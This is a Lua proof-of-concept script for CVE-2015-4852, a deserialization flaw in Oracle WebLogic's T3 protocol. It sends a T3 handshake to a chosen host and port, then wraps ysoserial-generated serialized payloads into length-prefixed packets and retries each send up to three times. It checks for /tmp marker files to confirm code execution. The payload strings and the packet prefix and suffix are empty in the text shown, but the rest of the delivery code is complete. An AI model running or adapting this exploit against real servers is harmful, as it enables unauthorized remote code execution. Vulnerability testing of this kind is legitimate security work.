local payload1=""
local payload2=""
local payload3=""
local payload4=""

local payloads={payload1, payload2, payload3, payload4}
local existsFiles={
    '/tmp/weblogicVul1', 
    '/tmp/weblogicVul2', 
    '/tmp/weblogicVul3', 
    '/tmp/weblogicVul4',
}

-- Convert string of a hex form like 'aced' into standard string
--
-- @param str The hex string to be converted
-- @return The standard string that converted from str
function string.fromhex(str)
    return (str:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

-- Convert string into a hex form like 'aced' 
--
-- @param str The String to be converted
-- @return The hex string that converted from str
function string.tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

-- Convert an integer into hex string
--
-- e.g. The output of DEC_HEX(26) is '1a'
--
-- @param IN The integer to be converted
-- @return The String contains the hex form of IN
function DEC_HEX(IN)
    local B,K,OUT,I,D=16,"0123456789abcdef","",0
    while IN>0 do
        I=I+1
        IN,D=math.floor(IN/B),math.mod(IN,B)+1
        OUT=string.sub(K,D,D)..OUT
    end
    return OUT
end

-- prepend '0' to the str until the length of str is 8
--
-- @param str The String to be prepended '0' to
-- @return The prepended string. If the length of str is more than 8, nil will be returned
function prependTo8(str)
    if str:len()<=8 then
        local prependNum=8-str:len()
        for i=1, prependNum do
            str='0'..str
        end
    else
        return nil
    end

    return str
end

-- Wrap the payload data into a whole data packet
--
-- @param payloadHex The payload data geenrated by ysoserial.jar
-- @return The entire data packet that can be identified by T3 protocol
function formPayload(payloadHex)
    local payloadPre=(''):fromhex()
    local payloadApp=(""):fromhex()

    local consPayload=payloadHex:fromhex()
    local payload=payloadPre..consPayload..payloadApp

    local payloadLenHex=prependTo8(DEC_HEX(payload:len()))
    local payloadLenHexStr=payloadLenHex:fromhex()
    local payloadFinal=payloadLenHexStr..payload:sub(5)

    return payloadFinal
end

-- Find whether the exploit succeed or not
--
-- @return A list of types of exploit succeeded
function isSuccess()
    local result={}
    for key, file in ipairs(existsFiles) do
        if isExists(file) then
            table.insert(result, key)
            os.remove(file)
        end
    end

    return result
end

-- Find whether the specified file exists
--
-- @param fileName The path of specified file
-- @return Whether the specified file exists
function isExists(fileName)
    local file=io.open(fileName,"r")

    if file~=nil then 
        io.close(file) 
        return true 
    else 
        return false 
    end
end

-- Launch a exploit using given payload to specified [hostname:port]
--
-- @param payload The payload carries exploit
-- @param key The type of launched exploit
-- @param hostname The target host name
-- @param hostname The target host port
-- @return Whether the exploit succeed or not
function launch(payload, key, hostname, port)
    local hostBound=socket.connect(hostname, port)
    local headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
    --print('sending ' ,headers)

    hostBound:send(headers)
    
    local firData=hostBound:receive()
    print("received data is", firData)

    local payloadFinal=formPayload(payload)
    local sendSta=hostBound:send(payloadFinal)

    if sendSta then
        print(string.format("The connections send payload SUCCESS! %d", sendSta))
        return true
    else
        print(string.format("The connections send payload NOT SUCCESS!"))
        return false
    end
end

-- launch the socket gently. Attempt to send the data no more than 3 times
--
-- @param payload The payload carries exploit
-- @param key The type of launched exploit
-- @param hostname The target host name
-- @param hostname The target host port
-- @return Whether the exploit succeed or not
function gentLaunch(payload, key, hostname, port)
    local res=nil
    for i=1, 3 do
        print(string.format("Launch %d time for %s", i, existsFiles[key]))
        res=launch(payload, key, hostname, port)
        if res then
            return res
        end
    end
end

-- launch all method of CVE-2015-4852-
--
-- @param payload The payload carries exploit
-- @param key The type of launched exploit
-- @return Whether the exploit succeed or not
function launchAll(hostname, port)
    for key, payload in pairs(payloads) do
        local lauchRes=gentLaunch(payload, key, hostname, port)
    end
end

-- Sleep for n seconds
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end

-- Find whether the vulnerablity CVE-2015-4852 exists
--
-- @param hostname The target host name
-- @param hostname The target host port
-- @return Whether the vulnerablity exists or not
-- @return If the vulnerablity exists, return a list of exploit types. Otherwise, return nil
function poc(hostname, port)

    launchAll(hostname, port)
    
    sleep(3)
    local successFiles=isSuccess()

    if table.getn(successFiles) > 0 then
        return true, successFiles
    else
        return false, nil
    end
end


